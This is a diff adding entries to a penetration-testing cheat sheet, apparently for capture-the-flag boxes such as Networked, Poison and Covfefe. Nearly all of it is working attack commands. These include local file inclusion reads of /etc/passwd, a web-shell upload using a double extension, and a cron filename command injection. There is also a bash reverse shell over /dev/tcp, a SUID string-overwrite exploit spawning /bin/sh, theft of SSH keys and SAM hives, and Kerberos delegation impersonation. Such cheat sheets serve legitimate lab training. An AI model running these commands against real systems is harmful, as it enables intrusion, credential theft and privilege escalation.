@@ -71,9 +71,31 @@ wpscan --url http://$BoxIP --enumerate u,vp,vt
 
 # Save a raw response
 curl -s "http://$BoxIP/$Path" -o $ResponseFile
+# Download and inspect a disclosed source archive before testing its handlers
+curl -sS "http://$BoxIP/backup/backup.tar" -o "$BoxDir/loot/backup.tar"
+tar -tvf "$BoxDir/loot/backup.tar"
+mkdir -p "$BoxDir/loot/source"
+tar -xf "$BoxDir/loot/backup.tar" -C "$BoxDir/loot/source"
+grep -RniE 'upload|move_uploaded_file|exec\(|system\(|cron|filename|mime' "$BoxDir/loot/source"
 
 # Route requests through Burp
 curl --proxy 127.0.0.1:8080 http://$BoxIP/$Path
+
+# LFI baseline and PHP source disclosure
+curl -sG "http://$BoxIP/$Path" --data-urlencode "file=/etc/passwd"
+curl -sG "http://$BoxIP/$Path" --data-urlencode "file=php://filter/convert.base64-encode/resource=$File" | base64 -d
+
+# Save a long encoded response, then decode it without printing the result
+curl -s "http://$BoxIP/$Path" -o "$BoxDir/loot/raw_response.txt"
+python3 - "$BoxDir/loot/raw_response.txt" "$BoxDir/loot/decoded.txt" <<'PY'
+import base64, sys
+from pathlib import Path
+src, dst = map(Path, sys.argv[1:])
+value = b"".join(src.read_bytes().splitlines()[2:])
+for _ in range(13):
+    value = base64.b64decode(value)
+dst.write_bytes(value)
+PY
 ```
 
 ### Virtual hosts
@@ -113,6 +135,15 @@ psql -h $BoxIP -p $Port -U postgres
 mysql -u $Username -p$Password -h $BoxIP -P $Port
 # Test PostgreSQL on a non-standard port with the documented default account
 psql -h $BoxIP -p $Port -U postgres -d postgres
+
+# FreeBSD local listener and process checks after an SSH foothold
+netstat -an
+ps aux | grep -i vnc
+
+# Retrieve and inspect a credential-bearing archive without printing its contents
+scp "$Username@$BoxIP:/home/$Username/secret.zip" "$BoxDir/loot/secret.zip"
+unzip -l "$BoxDir/loot/secret.zip"
+unzip -P "$Password" "$BoxDir/loot/secret.zip" -d "$BoxDir/loot/secret-dir"
 ```
 
 <!-- TODO --> <!-- Add application-specific default credential pairs when documented. -->
@@ -188,6 +219,10 @@ unzip -l $File
 curl -s "http://$BoxIP/$Path?file=php://filter/convert.base64-encode/resource=$Config" | base64 -d
 # Confirm command execution through a data wrapper
 curl -s "http://$BoxIP/$Path?file=data://text/plain;base64,$PAYLOAD"
+
+# Poison: LFI and disclosed file listing
+curl -sG "http://$BoxIP/browse.php" --data-urlencode "file=/etc/passwd"
+curl -s "http://$BoxIP/listfiles.php"
 ```
 
 ### FILE UPLOAD
@@ -195,6 +230,9 @@ curl -s "http://$BoxIP/$Path?file=data://text/plain;base64,$PAYLOAD"
 ```bash
 curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$File" -F "submit=Upload"
 curl -s "http://$BoxIP/$UploadedPath"
+# Networked: image/PHP polyglot with a second extension
+curl -sS -i -X POST "http://$BoxIP/upload.php" -F "myFile=@$File;filename=networked.php.jpg" -F 'submit=go!'
+boxset Path "uploads/$(printf '%s' "$LocalIP" | tr . _).php.jpg"
 # Nibbleblog 4.0.3 authenticated My Image plugin upload, then trigger the renamed PHP file
 curl -s -b $CookieFile -F 'plugin=my_image' -F 'title=My image' -F 'position=4' -F 'caption=' -F 'image=@$PayloadFile;type=application/x-php' -F 'image_resize=1' -F 'image_width=230' -F 'image_height=200' -F 'image_option=auto' "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
 curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
@@ -202,6 +240,16 @@ curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
 curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$BoxDir/$Archive" -F "submit=Upload"
 # Enumerate an archive layout before using it as a CMS plugin or theme
 unzip -l $BoxDir/$Archive
+```
+
+### Custom dotfile and SSH-key exposure
+
+```bash
+# Read robots.txt on an unusual HTTP service and save exposed history/key files as loot
+curl -i http://$BoxIP:$WebPort/robots.txt
+gobuster dir -u http://$BoxIP:$WebPort/ -w $Wordlist -x txt,py,html -t 30 -o $BoxDir/nmap/gobuster.txt
+curl -s http://$BoxIP:$WebPort/.bash_history -o $BoxDir/loot/bash_history.txt
+curl -s http://$BoxIP:$WebPort/.ssh/id_rsa -o $KeyFile
 ```
 
 ### COMMAND INJECTION
@@ -212,6 +260,12 @@ curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=$Command"
 # PHP web-shell command parameter, preserving shell metacharacters in the form body
 curl -sS -X POST --data-urlencode 'cmd=id' "http://$BoxIP/$Path"
 curl -sS -X POST --data-urlencode "cmd=$Command" "http://$BoxIP/$Path"
+# Networked: inspect the cron source and wait for the scheduled execution
+curl -sS -G --data-urlencode 'cmd=cat /home/guly/crontab.guly' "http://$BoxIP/$Path"
+curl -sS -G --data-urlencode 'cmd=sed -n "1,240p" /home/guly/check_attack.php' "http://$BoxIP/$Path"
+# Networked: a controlled filename marker for unquoted cron command injection
+echo 'x;touch${IFS}networked_pwned' > "$File"
+# Staging the marker locally is not enough: the string must become the remote filename through the confirmed upload/webshell path.
 # Bash callback through a PHP web shell; start the listener first
 nc -lvnp $Lport
 curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'" "http://$BoxIP/$Path" >/dev/null
@@ -295,6 +349,22 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 ```
 
 > Use a null-free Linux x86 payload when a PE server runs under Wine on a Linux target. Keep the service socket open during shell startup when the payload depends on the triggering connection.
+
+### Custom SUID adjacent-string overwrite
+
+```bash
+# Locate the helper, review readable source, and inspect native ELF metadata
+find / -type f -perm -4000 -printf '%M %u %g %p\n' 2>/dev/null | sort
+sed -n '1,160p' $SourceFile
+checksec --file=$SuidPath
+readelf -h -l -s $SuidPath
+objdump -d -M intel $SuidPath
+# Source-derived layout: five accepted bytes, fifteen padding bytes, then a NUL-terminated shell path
+(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) | $SuidPath
+id
+```
+
+> This Covfefe path overwrites a local string consumed by `execve()`. It is a buffer-overwrite exploit, but not a saved-return-address, shellcode, or ROP exploit.
 
 ## 6. FOOTHOLD: SHELLS & PAYLOADS
 
@@ -442,10 +512,19 @@ cmdkey /list
 
 ```bash
 sudo -l
+# Non-interactive sudo listing for scripts that do not require a password
+sudo -n -l
+# Read a sudo-allowed configuration generator and its privileged consumer
+sed -n '1,240p' $SudoScript
+grep -RniE 'source|\. |ifup|ifdown|systemctl|service|eval|exec|echo.*\$' $SudoScript /usr/local/sbin 2>/dev/null
+# Networked-style prompt sequence, only after confirming the script and sourced helper
+# Inputs: x, x, x, dhcp /bin/bash
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -2000 -type f 2>/dev/null
 getcap -r / 2>/dev/null
 cat /etc/crontab
+# User-specific crontab locations are worth checking after a web foothold
+find /home -maxdepth 2 -type f \( -name 'crontab.*' -o -name '*cron*' \) -ls 2>/dev/null
 cat /etc/passwd
 cat /etc/shadow 2>/dev/null
 uname -a
@@ -593,6 +672,28 @@ windapsearch -d $Domain --dc-ip $BoxIP -U
 # AS-REP roast and crack
 impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
 hashcat -m 18200 $LootDir/asrep.txt $Wordlist
+
+# Anonymous LDAP RootDSE and user enumeration
+ldapsearch -x -H ldap://$BoxIP -s base namingContexts defaultNamingContext dnsHostName
+ldapsearch -x -H ldap://$BoxIP -b "DC=$Domain" '(|(objectClass=user)(objectClass=computer))' sAMAccountName userPrincipalName description
+
+# Tomcat HTML Manager upload when manager-script is unavailable
+JSESSION=$(grep -o 'jsessionid=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)
+CSRF=$(grep -o 'CSRF_NONCE=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)
+curl -s -u "$Username:$Password" -b "JSESSIONID=$JSESSION" \
+  -F "deployWar=@$BoxDir/exploits/$BoxName.war;type=application/octet-stream" \
+  "http://$BoxIP:$WebPort/manager/html/upload;jsessionid=$JSESSION?org.apache.catalina.filters.CSRF_NONCE=$CSRF"
+
+# Export and parse local SAM, SYSTEM, and SECURITY hives
+reg save HKLM\SAM C:\Temp\SAM /y
+reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
+reg save HKLM\SECURITY C:\Temp\SECURITY /y
+secretsdump.py -sam $BoxDir/loot/SAM -system $BoxDir/loot/SYSTEM -security $BoxDir/loot/SECURITY LOCAL
+
+# Resource-Based Constrained Delegation and S4U ticket
+bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP add rbcd $TargetComputer $MachineAccount
+getST.py -spn "cifs/$FQDN" -impersonate $AdminUser -dc-ip $BoxIP "$Domain/$MachineAccount" -hashes ":$NThash"
+KRB5CCNAME=$BoxDir/loot/Administrator.ccache wmiexec.py -k -no-pass $FQDN
 ```
 
 ```bash
@@ -660,6 +761,7 @@ lazagne.exe all
 # SSH private key passphrase
 ssh2john $KeyFile > $HashFile
 john --wordlist=$Wordlist $HashFile
+john --show $HashFile
 ```
 
 <!-- TODO --> <!-- Add concise Net-NTLM relay, KeePass, BitLocker, and MSSQL password attack commands. -->
@@ -710,6 +812,7 @@ fc /b C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
 ```bash
 # Verify a removed webshell returns 404
 curl -s -o /dev/null -w "%{http_code}" http://$BoxIP/$Path
+boxdone
 md5sum $File
 ```
 
